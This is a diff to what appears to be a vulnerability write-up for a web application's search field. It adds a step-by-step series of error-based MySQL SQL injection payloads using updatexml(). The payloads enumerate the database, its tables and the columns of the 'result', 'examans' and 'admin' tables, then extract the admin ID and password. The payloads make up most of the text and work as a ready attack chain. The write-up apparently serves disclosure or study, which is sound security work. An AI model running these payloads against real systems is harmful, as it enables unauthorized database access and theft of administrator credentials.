@@ -86,84 +86,137 @@ Additional context:
 Using blacklist-based filtering is not reliable. Attackers can bypass such filters easily by using encoding tricks, inline comments, or alternate syntax.
 
 
+We can identify SQL injection by adding a single quote to the search.
 
 <img width="1388" height="684" alt="image" src="https://github.com/user-attachments/assets/1a96003b-e14f-4b81-9ab9-55cec3bda1ec" />
 
+We can see that when making an SQL query, it is not shown in the query response.
 
 <img width="1318" height="705" alt="image" src="https://github.com/user-attachments/assets/e7b92457-4912-4004-9a13-20940ab0e74d" />
 
+- updatexml()
+updatexml() is a MySQL function used to update an XML document.
+When the syntax is incorrect (for example, we used unexpected data), it returns an error containing the string we passed.
+
+- Payload database:
+a' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) AND '1'='1
+
+
+- Payload table 1:
+a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1) AND '1'='1
+
 <img width="1332" height="691" alt="image" src="https://github.com/user-attachments/assets/6c090e3a-ac3f-482e-9f80-4d4b1cbb976f" />
+
+- Payload table 2:
+a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1),0x7e),1) AND '1'='1
 
 <img width="974" height="688" alt="image" src="https://github.com/user-attachments/assets/d0267c7b-92d0-4f76-9938-6f49f13b0338" />
 
+- Payload table 3:
+a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1),0x7e),1) AND '1'='1
+
 <img width="1290" height="683" alt="image" src="https://github.com/user-attachments/assets/835de28a-49ea-48b9-915d-f91c13590979" />
+
+- Payload table 4:
+a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 3,1),0x7e),1) AND '1'='1
 
 <img width="1357" height="675" alt="image" src="https://github.com/user-attachments/assets/df825170-7ec3-4a09-b217-2bcaf6e2d40c" />
 
+- Payload table 5:
+a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 4,1),0x7e),1) AND '1'='1
+
 <img width="1303" height="702" alt="image" src="https://github.com/user-attachments/assets/6a116325-cb3f-4b38-9502-dfa59eb25504" />
+
+- Payload table 6:
+a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 5,1),0x7e),1) AND '1'='1
 
 <img width="1315" height="694" alt="image" src="https://github.com/user-attachments/assets/6ef4cf56-d7c7-42db-b0fd-bdce2752535b" />
 
+- Payload table 7:
+a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 6,1),0x7e),1) AND '1'='1
+
 <img width="1368" height="666" alt="image" src="https://github.com/user-attachments/assets/2400409d-b7f7-45f6-b140-585867510790" />
+
+- Payload table 8:
+a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 7,1),0x7e),1) AND '1'='1
 
 <img width="1496" height="363" alt="image" src="https://github.com/user-attachments/assets/a8bbdbb6-b2fa-4879-b89e-2270c6af61cb" />
 
+
+a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='examans' LIMIT 0,1),0x7e),1) AND '1'='1
 <img width="1491" height="397" alt="image" src="https://github.com/user-attachments/assets/ace6e519-6fcf-45b6-9df6-620ddcff9b97" />
 
+
+
+a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='result' LIMIT 0,1),0x7e),1) AND '1'='1
 <img width="1095" height="712" alt="image" src="https://github.com/user-attachments/assets/fcd7a3d3-9369-41f2-a322-54e1ce45bf17" />
 
+
+
+a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='result' LIMIT 1,1),0x7e),1) AND '1'='1
 <img width="1359" height="709" alt="image" src="https://github.com/user-attachments/assets/bce09fc3-51b6-4000-b1af-995b450f7bb6" />
 
+
+
+a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='result' LIMIT 2,1),0x7e),1) AND '1'='1
 <img width="1404" height="717" alt="image" src="https://github.com/user-attachments/assets/d2a90922-c391-459a-9656-163a933d039e" />
+
+
+- Payload
+a' AND updatexml(1,concat(0x7e,(SELECT RsID FROM result LIMIT 0,1),0x7e),1) AND '1'='1
 
 <img width="1348" height="702" alt="image" src="https://github.com/user-attachments/assets/1f9be308-1ad5-4e16-9275-ae51de452bc0" />
 
+
+
+- Payload column to table admin:
+a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='admin' LIMIT 0,1),0x7e),1) AND '1'='1
+
 <img width="1401" height="706" alt="image" src="https://github.com/user-attachments/assets/f1933ec8-d2ca-431c-89c5-0eee74193501" />
+
+
+- Payload column to table admin:
+a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='admin' LIMIT 1,1),0x7e),1) AND '1'='1
 
 <img width="1340" height="678" alt="image" src="https://github.com/user-attachments/assets/4377d5fd-6423-4eb6-b9f7-2df88b37430b" />
 
+
+- Payload Aid to admin:
+a' AND updatexml(1,concat(0x7e,(SELECT Aid FROM admin LIMIT 0,1),0x7e),1) AND '1'='1
+
 <img width="1339" height="686" alt="image" src="https://github.com/user-attachments/assets/648b0847-e327-4591-8380-16ff6a381287" />
+
+
+- Payload password to admin:
+
+a' AND updatexml(1,concat(0x7e,(SELECT Apass FROM admin LIMIT 0,1),0x7e),1) AND '1'='1  
 
 <img width="1330" height="677" alt="image" src="https://github.com/user-attachments/assets/4abd07b9-f958-45c6-8c78-f44b2c994cb7" />
 
 
-a' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) AND '1'='1
 
-a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1) AND '1'='1
 
-a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1),0x7e),1) AND '1'='1
 
-a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1),0x7e),1) AND '1'='1
-
-a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 3,1),0x7e),1) AND '1'='1
-
-a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 4,1),0x7e),1) AND '1'='1
-
-a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 5,1),0x7e),1) AND '1'='1
-
-a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 6,1),0x7e),1) AND '1'='1
-
-a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 7,1),0x7e),1) AND '1'='1
 
 a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 8,1),0x7e),1) AND '1'='1
 
-a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='examans' LIMIT 0,1),0x7e),1) AND '1'='1
 
-a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='result' LIMIT 0,1),0x7e),1) AND '1'='1
 
-a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='result' LIMIT 1,1),0x7e),1) AND '1'='1
 
-a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='result' LIMIT 2,1),0x7e),1) AND '1'='1
 
-a' AND updatexml(1,concat(0x7e,(SELECT RsID FROM result LIMIT 0,1),0x7e),1) AND '1'='1
 
-a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='admin' LIMIT 0,1),0x7e),1) AND '1'='1
 
-a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='admin' LIMIT 1,1),0x7e),1) AND '1'='1
 
-a' AND updatexml(1,concat(0x7e,(SELECT Apass FROM admin LIMIT 0,1),0x7e),1) AND '1'='1  
 
-a' AND updatexml(1,concat(0x7e,(SELECT Aid FROM admin LIMIT 0,1),0x7e),1) AND '1'='1
+
+
+
+
+
+
+
+
+
 
 
 
